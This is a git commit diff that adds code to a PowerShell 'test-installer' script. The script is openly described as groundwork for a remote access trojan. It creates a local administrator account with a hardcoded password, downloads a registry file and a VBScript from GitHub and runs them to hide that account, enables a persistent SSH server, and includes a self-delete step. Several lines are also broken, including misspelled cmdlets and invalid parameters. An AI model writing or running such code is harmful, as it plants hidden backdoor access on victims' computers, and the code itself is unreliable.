f593df5e8faf00cedea7ef1cde667b4cfa4373a4
Promite <36072396+Promite@users.noreply.github.com>
2022-06-29 19:18:21 +1000

    Update test-installer.ps1

--- test-installer.ps1
+++ test-installer.ps1
@@ -6,12 +6,55 @@ function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
     }
 
+# create local admin for rat (Create_account = Create-NewLocalAdmin = , uname = NewLocalAdmin, pword = Password)
+function Create_account {
+    [CmdletBinding()]
+    param (
+        [string] $uname,
+        [securestring] $pword
+    )
+    begin {
+    }
+    process {
+        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
+        Write-Verbose "$uname local user created"
+        Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "$uname"
+    }
+    end {     
+    }
+}
+
 #variable
 $wd = random_text
 $path = "$env:temp/$wd"
-echo $path
+$initial_dir = Get-Location
+
+# create admin user
+$uname = System
+$pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+Create_account -uname $uname -pword $pword
 
 # go to temp, make working directory
 mkdir $path
 cd $path
-echo "" > poc.txt
+
+# registry to hide local admin
+Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-reg.reg -Outfile "reg.reg"
+
+# visual basic script to regiser the registry
+Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-script.vbs -Outfile "script.vbs"
+
+# install the registry
+./reg.reg; ./script.vbs
+
+# enabling persistent SSH
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Serivce -Name sshd
+-StartupType 'Automatic'
+#removed for some reason?
+#Get-NetFirewallRule -Name *ssh*
+
+# delete self
+cd $initial_dir
+# del installer.ps1
